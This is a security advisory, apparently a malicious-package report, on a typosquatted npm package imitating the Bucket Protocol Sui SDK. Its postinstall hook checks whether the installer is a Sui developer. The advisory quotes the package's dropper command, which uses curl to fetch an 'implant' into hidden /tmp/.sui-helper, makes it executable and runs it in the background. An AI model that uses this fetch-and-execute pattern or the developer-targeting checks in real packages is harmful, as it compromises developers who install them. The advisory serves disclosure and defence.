summary: Typosquat of Bucket Protocol SDK ships postinstall dropper targeting Sui developers
details: Package name `bucket-protocol-sdk-v2` impersonates the legitimate `bucket-protocol-sdk` Sui SDK with a `-v2` suffix and self-describes as a 'community maintained drop-in replacement'. The package ships no real implementation (`src/bucket.ts` is `export {};`, the declared `dist/index.js` main entry is effectively empty) and exists only to run a `postinstall` hook (`node install.js`). `install.js` lines 9-12 detect whether the installer is a Sui blockchain developer (checks for the `sui` CLI on PATH and for `~/.sui/sui_config/client.yaml`) and, if so, executes `curl -s -L -o /tmp/.sui-helper ${implantUrl} && chmod +x /tmp/.sui-helper && /tmp/.sui-helper &` — staging a fetched binary to a hidden dot-file under /tmp and running it in the background. The variable is literally named `implantUrl` with a comment instructing the operator to insert a `0x0.st` (anonymous file host) URL. Although the URL string is empty in this published artifact, the structure is an armed dropper template gated on Sui developer fingerprinting, with no legitimate purpose. Author metadata is empty. Combined: name-impersonation of a real Sui SDK + hollow source + Sui-developer victim gating + curl-to-/tmp/.sui-helper + chmod+x + background exec from an anonymous host is an unambiguous targeted supply-chain attack on Sui developers.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
